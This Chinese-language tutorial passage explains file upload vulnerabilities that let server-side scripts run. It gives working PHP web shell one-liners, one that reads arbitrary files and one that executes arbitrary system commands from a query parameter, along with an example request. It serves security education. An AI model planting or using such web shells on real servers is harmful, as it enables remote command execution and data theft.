## 从安全角度看，最糟糕的情况是网站允许你上传服务器端脚本，比如 PHP、Java 或 Python 文件，并且还配置成以代码形式执行。这使得在服务器上创建自己的 Web shell 变得轻而易举。

```
web shell是一种恶意脚本，使攻击者能够通过向正确的端点发送 HTTP 请求，在远程网络服务器上执行任意命令。

```

## 如果你能成功上传web shell，你实际上就完全控制了服务器。这意味着你可以读写任意文件，窃取敏感数据，甚至利用服务器来针对内部基础设施和网络外其他服务器发动攻击。例如，以下 PHP 一行代码可用于从服务器文件系统读取任意文件：
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
## 上传后，发送对该恶意文件的请求将在响应中返回目标文件的内容。

## 一个更灵活的网页外壳可能看起来像这样：
```
<?php echo system($_GET['command']); ?>
```

## 该脚本允许您通过查询参数传递任意系统命令，具体如下：
```
GET /example/exploit.php?command=id HTTP/1.1
```
